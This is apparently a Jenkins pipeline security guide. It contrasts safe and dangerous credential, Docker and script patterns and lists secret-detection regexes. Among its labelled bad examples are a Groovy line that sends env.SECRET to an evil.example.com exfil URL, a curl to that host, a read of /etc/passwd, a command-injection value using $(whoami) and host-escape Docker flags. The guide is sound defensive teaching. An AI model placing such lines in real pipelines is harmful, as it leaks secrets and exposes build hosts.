# Jenkins Pipeline Security Patterns

## Credential Handling

### Safe patterns
```groovy
// Environment-level credential binding
environment {
    DEPLOY_TOKEN = credentials('deploy-token-id')
}

// Scoped credential access
withCredentials([string(credentialsId: 'api-key', variable: 'KEY')]) {
    sh 'curl -H "Authorization: $KEY" https://api.example.com'
}

// Username/password binding with scoped Docker config
withCredentials([usernamePassword(
    credentialsId: 'docker-hub',
    usernameVariable: 'DOCKER_USER',
    passwordVariable: 'DOCKER_PASS'
)]) {
    sh '''
        set -e
        export DOCKER_CONFIG="$(mktemp -d)"
        trap 'rm -rf "$DOCKER_CONFIG"' EXIT
        printf '%s' "$DOCKER_PASS" | docker --config "$DOCKER_CONFIG" login "$REGISTRY" -u "$DOCKER_USER" --password-stdin
        docker --config "$DOCKER_CONFIG" push "$REGISTRY/$IMAGE:$TAG"
    '''
}
```

### Dangerous patterns
```groovy
// DANGEROUS: hardcoded secret
sh 'curl -H "Authorization: Bearer abc123token" https://api.example.com'

// DANGEROUS: GString interpolation exposes secret in build log
withCredentials([string(credentialsId: 'key', variable: 'KEY')]) {
    sh "curl -H 'Auth: ${KEY}' https://api.example.com"
}

// DANGEROUS: echoing secrets
echo "Token is: ${env.SECRET_TOKEN}"

// DANGEROUS: writing secrets to files that get archived
writeFile file: 'config.json', text: """{"token": "${TOKEN}"}"""
archiveArtifacts 'config.json'
```

## Docker Security

### Image pinning
```groovy
// GOOD: pinned to specific version
agent { docker { image 'node:20.11.1-alpine3.19' } }

// BAD: unpinned
agent { docker { image 'node' } }
agent { docker { image 'node:latest' } }
```

### Docker login anti-patterns
```groovy
// BAD: echo may be an external binary — password visible in /proc/<pid>/cmdline
sh 'echo $DOCKER_PASS | docker login -u $DOCKER_USER --password-stdin'

// BAD: docker login writes base64 credentials to ~/.docker/config.json
// Any process on the agent can read it, and it persists after the build
sh 'docker login -u $DOCKER_USER -p $DOCKER_PASS'

// BAD: <<< (here-string) creates a temp file under /proc/<pid>/fd/
sh '#!/bin/bash\ndocker login --password-stdin <<< "$DOCKER_PASS"'

// GOOD: printf is a shell builtin (no /proc exposure), scoped config dir
sh '''
    export DOCKER_CONFIG="$(mktemp -d)"
    trap 'rm -rf "$DOCKER_CONFIG"' EXIT
    printf '%s' "$DOCKER_PASS" | docker --config "$DOCKER_CONFIG" login "$REGISTRY" -u "$DOCKER_USER" --password-stdin
'''

// BEST: use Docker credential helpers or OIDC — no credentials on the agent at all
```

### Dangerous Docker flags
- `--privileged` — full host access
- `-v /:/host` — host root filesystem mount
- `-v /var/run/docker.sock:/var/run/docker.sock` — Docker-in-Docker escape
- `--net=host` — host network access
- `--pid=host` — host process namespace

## Input Sanitization: Allowlist Over Blocklist

When validating paths, Docker tags, or any string that will be interpolated into
shell commands, **always use a positive allowlist** — never a blocklist.

### Why blocklists fail
A blocklist like `/[;&|`\$]/` tries to block known-dangerous characters. But it
will inevitably miss characters that enable injection:
- Missing `'` → `cd 'foo'$(whoami)'bar'` breaks out of single-quoted `sh` strings
- Missing `"` → similar injection via double-quote context
- Missing newline → command injection via embedded `\n`

### Correct pattern: allowlist
```groovy
static String sanitizePath(String path) {
    if (path.contains('..'))
        throw new IllegalArgumentException("Path must not contain '..'")
    // Only permit known-safe characters
    if (!(path ==~ /^[a-zA-Z0-9][a-zA-Z0-9\/_\-.+]*$/) && path != '.')
        throw new IllegalArgumentException("Path contains disallowed characters")
    return path
}

static void validateDockerTag(String tag) {
    // Only permit known-safe characters for Docker tags
    if (!(tag ==~ /^[a-zA-Z0-9][a-zA-Z0-9._-]*$/))
        throw new IllegalArgumentException("Invalid Docker tag: ${tag}")
}
```

**Rule:** If the string will appear in a shell command, define what characters ARE
allowed (alphanumeric + minimal punctuation), not what characters are forbidden.

## Script Block Risks

### Code injection vectors
```groovy
// DANGEROUS: @Grab can pull arbitrary code
script {
    @Grab('org.example:malicious:1.0')
    import org.example.Backdoor
}

// DANGEROUS: arbitrary URL access
script {
    def url = new URL("https://evil.example.com/exfil?data=${env.SECRET}")
    url.text
}

// DANGEROUS: process execution
script {
    "curl https://evil.example.com".execute()
}

// DANGEROUS: file access
script {
    new File('/etc/passwd').text
}
```

## Library Security

### Pinned (safe)
```groovy
@Library('my-lib@v1.2.3') _
library 'my-lib@v1.2.3'
```

### Unpinned (risky)
```groovy
@Library('my-lib') _           // uses default branch
library 'my-lib'               // uses default branch
@Library('my-lib@main') _      // branch can change
```

## Access Control

### Input step hardening
```groovy
input message: 'Deploy to production?',
      ok: 'Deploy',
      submitter: 'admin,release-team',
      submitterParameter: 'APPROVER'
```

## Secret Detection Heuristics

Patterns that suggest hardcoded secrets:
- Strings matching `[A-Za-z0-9+/]{40,}` (base64 tokens)
- Strings matching `ghp_[A-Za-z0-9]{36}` (GitHub PAT)
- Strings matching `sk-[A-Za-z0-9]{32,}` (API keys)
- Strings matching `-----BEGIN (RSA )?PRIVATE KEY-----`
- Any string assigned to variables named `*PASSWORD*`, `*SECRET*`, `*TOKEN*`, `*KEY*`
